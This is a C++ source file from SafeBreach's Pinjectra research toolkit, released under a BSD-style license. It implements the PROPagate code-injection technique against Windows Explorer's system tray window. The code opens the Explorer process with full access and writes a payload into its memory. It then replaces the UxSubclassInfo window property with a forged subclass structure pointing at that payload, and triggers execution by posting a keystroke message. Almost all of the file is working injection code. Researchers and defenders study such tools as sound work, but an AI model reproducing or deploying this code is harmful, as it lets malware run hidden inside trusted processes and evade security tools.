// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include "PROPagate.h"

CodeViaPROPagate::~CodeViaPROPagate()
{
}

boolean CodeViaPROPagate::inject(DWORD ignored_1, DWORD ignored_2)
{
	RUNTIME_MEM_ENTRY* result;
	LPVOID target_payload;
	HWND h = FindWindowA("Shell_TrayWnd", NULL);
	char new_subclass[0x50];
	DWORD pid;

	if (h == NULL)
	{
		printf("FindWindow failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}
	GetWindowThreadProcessId(h, &pid);
	//printf("*** pid=%d\n", pid);
	//printf("[*] Locating sub window\n");
	HWND hst = GetDlgItem(h, 303); // System Tray
	if (hst == NULL)
	{
		printf("GetDlgItem(1) failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}
	//printf("[*] Locating dialog item\n");

	HWND hc = GetDlgItem(hst, 1504);
	if (hc == NULL)
	{
		printf("GetDlgItem(1) failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}

	/* Get Handle to process */

	//printf("[*] Opening process\n");
	HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (p == NULL)
	{
		printf("OpenProcess failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}

	result = this->m_memwriter->writeto(p, 0);

	target_payload = result->addr;

	HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (target_new_subclass == NULL)
	{
		printf("VirtualAllocEx(2) failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}
	//(HANDLE)(((DWORD64)target_payload) + sizeof(payload)); //target memory address for fake subclass structure

	HANDLE old_subclass = GetPropA(hc, "UxSubclassInfo"); //handle is the memory address of the current subclass structure

	if (!ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass, sizeof(new_subclass), NULL))
	{
		printf("ReadProcessMemory failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}

	//printf("[+] Current subclass structure was read to memory\n");


	memcpy(new_subclass + 0x18, &target_payload, sizeof(target_payload));
	//printf("[*] Writing fake subclass to process\n");
	if (!WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass, sizeof(new_subclass), NULL))
	{
		printf("WriteProcessMemory(2) failed, error: 0x%08x\n", GetLastError());
		exit(0);
	}

	//printf("[+] Fake subclass structure is written to memory\n");
	//printf("[+] Press enter to unhook the function and exit\r\n");
	//getchar();

	//SetProp(control, "CC32SubclassInfo", h);
	//printf("[*] Setting fake SubClass property\n");
	SetPropA(hc, "UxSubclassInfo", target_new_subclass);
	//printf("[*] Triggering shellcode....!!!\n");
	PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0);

	Sleep(1);
	//printf("[+] Restoring subclass header.\n");
	SetPropA(hc, "UxSubclassInfo", old_subclass);
}
